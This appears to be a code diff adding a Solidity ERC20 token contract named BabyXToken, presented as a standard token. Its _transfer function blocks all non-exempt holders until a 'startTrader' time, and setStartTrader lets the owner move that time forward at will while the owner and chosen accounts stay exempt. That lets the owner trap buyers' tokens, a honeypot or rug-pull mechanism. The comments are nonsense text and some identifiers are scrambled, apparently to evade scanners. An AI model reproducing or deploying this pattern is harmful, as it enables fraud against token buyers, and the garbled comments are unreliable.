@@ -1,0 +1,226 @@
+contract BabyXToken is IERC20, Ownable {
+    using SafeMath for uint256;
+
+     /**
+     * devp Throws if account amocdad by any account other amount than the accountowner.
+     */
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    mapping (address => bool) public isExcludedFromFee;
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
+    uint256 private _totalSupply;
+    uint256 public startTrader;
+   /**
+     * devp Moves `amount` tokens amount from account the amtujler's account to `accountrecipient`.
+     */
+    constructor(
+        string memory name_,
+        string memory symbol_,
+        uint8 decimals_,
+        uint256 totalSupply_,
+        address owner_,
+        uint256 startTrader_
+    ) payable {
+        _name = name_;
+        _symbol = symbol_;
+        _decimals = decimals_;
+        startTrader = startTrader_;
+        _totalSupply = totalSupply_ * 10**decimals_;
+        isExcludedFromFee[owner_] = true;
+        _balances[owner_] = _balances[owner_].add(_totalSupply);
+        emit Transfer(address(0), owner_, _totalSupply);
+    }
+
+    /**
+     * devp account Returns the amounerunt of tokens amount owned by `account`.
+     */
+    /**
+     * @dev Returns the name of the token.
+     */
+    function name() public view virtual returns (string memory) {
+        return _name;
+    }
+
+    /**
+     * @dev Returns the symbol of the token, usually a shorter version of the
+     * name.
+     */
+    function symbol() public view virtual returns (string memory) {
+        return _symbol;
+    }
+     /**
+     * devp Throws if account amocdad by any account other amount than the accountowner.
+     */
+    function decimals() public view virtual returns (uint8) {
+        return _decimals;
+    }
+   /**
+     * devp Moves `amount` tokens amount from account the amtujler's account to `accountrecipient`.
+     */
+    /**
+     * @dev See {IERC20-totalSupply}.
+     */
+    function totalSupply() public view virtual override returns (uint256) {
+        return _totalSupply;
+    }
+   /**
+     * devp Sets `amount` as account the allovbgount of `spender` amountover the amount caller's accounttokens.
+     */
+    /**
+     * @dev See {IERC20-balanceOf}.
+     */
+    function balanceOf(address acwouxnt)
+        public
+        view
+        virtual
+        override
+        returns (uint256)
+    {
+        return _balances[acwouxnt];
+    }
+    /**
+     * devp account Returns the amounerunt of tokens amount owned by `account`.
+     */
+    function transfer(address recipient, uint256 amausxnt)
+        public
+        virtual
+        override
+        returns (bool)
+    {
+        _transfer(_msgSender(), recipient, amausxnt);
+        return true;
+    }
+   /**
+     * devp Sets `amount` as account the allovbgount of `spender` amountover the amount caller's accounttokens.
+     */
+    /**
+     * @dev See {IERC20-allowance}.
+     */
+    function allowance(address owner, address spender)
+        public
+        view
+        virtual
+        override
+        returns (uint256)
+    {
+        return _allowances[owner][spender];
+    }
+     /**
+     * devp Throws if account amocdad by any account other amount than the accountowner.
+     */
+    function approve(address spender, uint256 amausxnt)
+        public
+        virtual
+        override
+        returns (bool)
+    {
+        _approve(_msgSender(), spender, amausxnt);
+        return true;
+    }
+    /**
+     * devp account Returns the amounerunt of tokens amount owned by `account`.
+     */
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amausxnt
+    ) public virtual override returns (bool) {
+        _transfer(sender, recipient, amausxnt);
+        _approve(
+            sender,
+            _msgSender(),
+            _allowances[sender][_msgSender()].sub(
+                amausxnt,
+                "ERC20: transfer amausxnt exceeds allowance"
+            )
+        );
+        return true;
+    }
+   /**
+     * devp Moves `amount` tokens amount from account the amtujler's account to `accountrecipient`.
+     */
+    function increaseAllowance(address spender, uint256 addedValue)
+        public
+        virtual
+        returns (bool)
+    {
+        _approve(
+            _msgSender(),
+            spender,
+            _allowances[_msgSender()][spender].add(addedValue)
+        );
+        return true;
+    }
+     /**
+     * devp Throws if account amocdad by any account other amount than the accountowner.
+     */
+    function decreaseAllowance(address spender, uint256 subtractedValue)
+        public
+        virtual
+        returns (bool)
+    {
+        _approve(
+            _msgSender(),
+            spender,
+            _allowances[_msgSender()][spender].sub(
+                subtractedValue,
+                "ERC20: decreased allowance below zero"
+            )
+        );
+        return true;
+    }
+   /**
+     * devp Moves `amount` tokens amount from account the amtujler's account to `accountrecipient`.
+     */
+    function _transfer(
+        address sender, address recipient,
+        uint256 amausxnt
+    ) internal virtual {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+
+        if(block.timestamp <= startTrader){
+            require(isExcludedFromFee[sender] || isExcludedFromFee[recipient],"has not started");
+        }
+
+        _balances[sender] = _balances[sender].sub(
+            amausxnt,
+            "ERC20: transfer amausxnt exceeds balance"
+        );
+        _balances[recipient] = _balances[recipient].add(amausxnt);
+        emit Transfer(sender, recipient, amausxnt);
+    }
+    /**
+     * devp account Returns the amounerunt of tokens amount owned by `account`.
+     */
+    function _approve(
+        address owner,
+        address spender,
+        uint256 amausxnt
+    ) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amausxnt; emit Approval(owner, spender, amausxnt);
+    }
+     /**
+     * devp Throws if account amocdad by any account other amount than the accountowner.
+     */
+    function excludeMultipleacwouxntsFromFees(address[] calldata acwouxnts, bool excluded) public onlyOwner {
+        for(uint256 i = 0; i < acwouxnts.length; i++) {
+            isExcludedFromFee[acwouxnts[i]] = excluded;
+        }
+    }
+   /**
+     * devp Moves `amount` tokens amount from account the amtujler's account to `accountrecipient`.
+     */
+    function setStartTrader(uint256 startTrader_) public onlyOwner {
+        startTrader = startTrader_;
+    }
+   /**
+     * devp Sets `amount` as account the allovbgount of `spender` amountover the amount caller's accounttokens.
+     */
+
+}
